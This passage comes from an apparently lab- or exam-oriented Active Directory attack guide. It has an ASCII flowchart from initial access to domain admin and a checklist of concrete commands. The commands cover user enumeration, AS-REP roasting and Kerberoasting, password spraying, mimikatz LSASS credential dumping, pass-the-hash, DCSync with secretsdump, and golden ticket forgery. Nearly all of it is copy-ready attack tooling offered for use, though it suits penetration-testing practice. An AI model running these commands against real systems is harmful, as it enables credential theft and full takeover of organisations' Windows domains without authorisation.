         +-----------+-----------+-----------------------+
         |                       |                       |
         v                       v                       v
    Password Spray         Kerberoasting             BloodHound
    nxc smb/winrm/rdp      GetUserSPNs -> 13100      SharpHound.exe
         |                       |                       |
         +-----------+-----------+                       v
                     |                         Check Shortest Paths to DA
                     v                                   |
           [ LOCAL ADMIN RIGHTS? ]                       v
                     |                         +---------+---------+
         +-----------+-----------+             |                   |
         |                       |             v                   v
        YES                     NO         ACL Abuse          Delegation
         |                       |         - GenericAll       - Unconstrained
         v                       v         - WriteDacl        - Constrained (S4U)
    Dump LSASS & SAM       Responder / mitm6 - WriteOwner       - RBCD
    secretsdump / mimikatz Capture NetNTLMv2 - ForceChangePW   AD CS (ESC1/ESC8)
         |                       |             |                   |
         +-----------+-----------+             +---------+---------+
                     |                                   |
                     v                                   v
             [ LATERAL MOVEMENT ] -------------> [ PRIVILEGED ACCOUNT ]
             - Pass-the-Hash (PtH)                       |
             - Pass-the-Ticket (PtT)                     v
             - Overpass-the-Hash                    [ DCSYNC ATTACK ]
                                                secretsdump -just-dc-user
                                                         |
                                                         v
                                                [ KRBTGT HASH RECOVERED ]
                                                         |
                                                         v
                                                [ GOLDEN TICKET FORGERY ]
                                                         |
                                                         v
                                                DOMAIN ADMINISTRATOR (ROOT)
```

---

# Phase 12: Quick Reference Active Directory Attack Checklist

```text
=== PHASE 1: TARGET DISCOVERY AND RECONNAISSANCE ===
[ ] Full TCP port scan on target range      -> nmap -p- -sC -sV -T4 -Pn [TARGET_SUBNET]
[ ] Identify Domain Controller host         -> Locate concurrent Ports 53, 88, 389, 445
[ ] Resolve Domain FQDN and NetBIOS names   -> Extract from LDAP naming contexts or SMB banner
[ ] Populate local /etc/hosts               -> echo "[DC_IP] corp.local dc01.corp.local" >> /etc/hosts

=== PHASE 2: UNAUTHENTICATED ENUMERATION ===
[ ] Query SMB Null Sessions                 -> nxc smb [TARGET_IP] -u '' -p '' --shares
[ ] Enumerate Kerberos Users via Kerbrute   -> kerbrute userenum -d corp.local --dc [DC_IP] users.txt
[ ] Query Anonymous LDAP Directory Bind     -> ldapsearch -x -H ldap://[DC_IP] -b "DC=corp,DC=local"
[ ] Test Unauthenticated AS-REP Roasting    -> impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip [DC_IP]

=== PHASE 3: AUTHENTICATED ENUMERATION (POST-FOOTHOLD) ===
[ ] Audit Domain Account Lockout Policy     -> net accounts /domain (Check Lockout Threshold)
[ ] Authenticated AS-REP Roasting           -> impacket-GetNPUsers corp.local/[USER]:'[PASS]' -request
[ ] Authenticated Kerberoasting             -> impacket-GetUserSPNs corp.local/[USER]:'[PASS]' -request
[ ] SYSVOL GPP Password Search              -> nxc smb [DC_IP] -u [USER] -p '[PASS]' -M gpp_password
[ ] User Description Password Harvesting    -> nxc ldap [DC_IP] -u [USER] -p '[PASS]' -M get-desc-users
[ ] BloodHound Ingestion                    -> bloodhound-python -u [USER] -p '[PASS]' -d corp.local -c all

=== PHASE 4: LATERAL MOVEMENT AND PRIVILEGE ESCALATION ===
[ ] Check Network-Wide Admin Access         -> nxc smb targets.txt -u [USER] -p '[PASS]' (Look for Pwn3d!)
[ ] Password Spraying Across Services       -> nxc smb/winrm/rdp targets.txt -u users.txt -p '[PASS]'
[ ] Pass-the-Hash Execution                 -> evil-winrm -i [TARGET_IP] -u [USER] -H [HASH]
[ ] Dump Memory Credentials via LSASS       -> mimikatz # privilege::debug; sekurlsa::logonpasswords
[ ] Overpass-the-Hash to Kerberos TGT       -> impacket-getTGT corp.local/[USER] -hashes :[HASH]
[ ] Execute BloodHound High-Value Edges     -> GenericAll, WriteDacl, WriteOwner, RBCD

=== PHASE 5: DOMAIN DOMINANCE AND TAKEOVER ===
[ ] Audit AD CS Templates (ESC1-ESC8)       -> certipy find -u [USER]@corp.local -p '[PASS]' -vulnerable
[ ] Execute DCSync Attack                   -> impacket-secretsdump corp.local/[ADMIN]:'[PASS]'@[DC_IP]
[ ] Forge Persistent Golden Ticket          -> impacket-ticketer -domain corp.local -nthash [KRBTGT_HASH] Administrator
[ ] Access Domain Controller Desktop        -> evil-winrm -i [DC_IP] -u Administrator -H [NTLM_HASH]
[ ] Harvest Flag Proofs Across All Hosts    -> type C:\Users\Administrator\Desktop\proof.txt
```
